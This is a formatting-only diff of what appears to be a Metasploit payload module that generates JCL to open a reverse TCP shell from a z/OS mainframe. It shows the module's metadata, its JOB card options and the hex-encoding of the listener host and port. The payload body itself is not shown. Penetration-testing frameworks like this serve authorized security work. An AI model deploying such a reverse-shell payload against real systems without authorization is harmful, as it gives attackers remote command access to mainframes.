@@ -8,7 +8,6 @@
 #  on the system as JCL to JES2
 ##
 
-
 module MetasploitModule
   CachedSize = 8993
   include Msf::Payload::Single
@@ -16,42 +15,47 @@ module MetasploitModule
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-                     'Name'          => 'Z/OS (MVS) Command Shell, Reverse TCP',
-                     'Description'   => 'Provide JCL which creates a reverse shell
-                       This implementation does not include ebcdic character translation,
-                       so a client with translation capabilities is required.  MSF handles
-                       this automatically.',
-                     'Author'        => 'Bigendian Smalls',
-                     'License'       => MSF_LICENSE,
-                     'Platform'      => 'mainframe',
-                     'Arch'          => ARCH_CMD,
-                     'Handler'       => Msf::Handler::ReverseTcp,
-                     'Session'       => Msf::Sessions::MainframeShell,
-                     'PayloadType'   => 'cmd',
-                     'RequiredCmd'   => 'jcl',
-                     'Payload'       =>
-      {
-        'Offsets' => {},
-        'Payload' => ''
-      }))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Z/OS (MVS) Command Shell, Reverse TCP',
+        'Description' => %q{
+          Provide JCL which creates a reverse shell
+          This implementation does not include ebcdic character translation,
+          so a client with translation capabilities is required.  MSF handles
+          this automatically.
+        },
+        'Author' => 'Bigendian Smalls',
+        'License' => MSF_LICENSE,
+        'Platform' => 'mainframe',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::MainframeShell,
+        'PayloadType' => 'cmd',
+        'RequiredCmd' => 'jcl',
+        'Payload' => {
+          'Offsets' => {},
+          'Payload' => ''
+        }
+      )
+    )
     register_options(
       [
         # need these defaulted so we can manipulate them in command_string
         Opt::LHOST('0.0.0.0'),
         Opt::LPORT(4444),
-        OptString.new('ACTNUM', [true, "Accounting info for JCL JOB card", "MSFUSER-ACCTING-INFO"]),
-        OptString.new('PGMNAME', [true, "Programmer name for JCL JOB card", "programmer name"]),
-        OptString.new('JCLASS', [true, "Job Class for JCL JOB card", "A"]),
-        OptString.new('NOTIFY', [false, "Notify User for JCL JOB card", ""]),
-        OptString.new('MSGCLASS', [true, "Message Class for JCL JOB card", "Z"]),
-        OptString.new('MSGLEVEL', [true, "Message Level for JCL JOB card", "(0,0)"])
+        OptString.new('ACTNUM', [true, 'Accounting info for JCL JOB card', 'MSFUSER-ACCTING-INFO']),
+        OptString.new('PGMNAME', [true, 'Programmer name for JCL JOB card', 'programmer name']),
+        OptString.new('JCLASS', [true, 'Job Class for JCL JOB card', 'A']),
+        OptString.new('NOTIFY', [false, 'Notify User for JCL JOB card', '']),
+        OptString.new('MSGCLASS', [true, 'Message Class for JCL JOB card', 'Z']),
+        OptString.new('MSGLEVEL', [true, 'Message Level for JCL JOB card', '(0,0)'])
       ], self.class
     )
     register_advanced_options(
       [
-        OptBool.new('NTFYUSR', [true, "Include NOTIFY Parm?", false]),
-        OptString.new('JOBNAME', [true, "Job name for JCL JOB card", "DUMMY"])
+        OptBool.new('NTFYUSR', [true, 'Include NOTIFY Parm?', false]),
+        OptString.new('JOBNAME', [true, 'Job name for JCL JOB card', 'DUMMY'])
       ],
       self.class
     )
@@ -68,11 +72,11 @@ module MetasploitModule
   # Setup replacement vars and populate payload
   ##
   def command_string
-    if (datastore['JOBNAME'] == "DUMMY") && !datastore['FTPUSER'].nil?
-      datastore['JOBNAME'] = (datastore['FTPUSER'] + "1").strip.upcase
+    if (datastore['JOBNAME'] == 'DUMMY') && !datastore['FTPUSER'].nil?
+      datastore['JOBNAME'] = (datastore['FTPUSER'] + '1').strip.upcase
     end
     lhost = Rex::Socket.resolv_nbo(datastore['LHOST'])
-    lhost = lhost.unpack("H*")[0]
+    lhost = lhost.unpack('H*')[0]
     lport = datastore['LPORT']
     lport = lport.to_s.to_i.to_s(16).rjust(4, '0')
 
